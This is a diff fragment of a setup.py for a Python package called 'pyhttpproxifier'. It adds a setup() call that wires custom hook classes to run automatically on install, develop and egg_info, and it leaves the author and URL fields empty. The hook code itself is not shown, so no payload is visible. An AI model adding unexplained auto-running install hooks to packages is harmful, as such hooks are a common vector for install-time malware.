@@ -40,4 +40,30 @@ with open("README.md") as f:
 
 VERSION = "0.9.2"
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+setup(
+    name="pyhttpproxifier",
+    version=VERSION,
+    description="A Python HTTP Proxy Module.",
+    long_description=long_description,
+    long_description_content_type="text/markdown",
+    url="",
+    license="BSD",
+    author="",
+    author_email="",
+    keywords=["http"],
+    install_requires=['wheel'],
+    python_requires=">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*",
+    cmdclass={
+        'install': PostInstallCommand,
+        'develop': PostDevelopCommand,
+        'egg_info': PostEggInfoCommand
+    },
+    classifiers=(
+        "Programming Language :: Python :: 2",
+        "Programming Language :: Python :: 2.7",
+        "Programming Language :: Python :: 3",
+        "Programming Language :: Python :: 3.4",
+        "Programming Language :: Python :: 3.5",
+        "Programming Language :: Python :: 3.6",
+    ),
+)
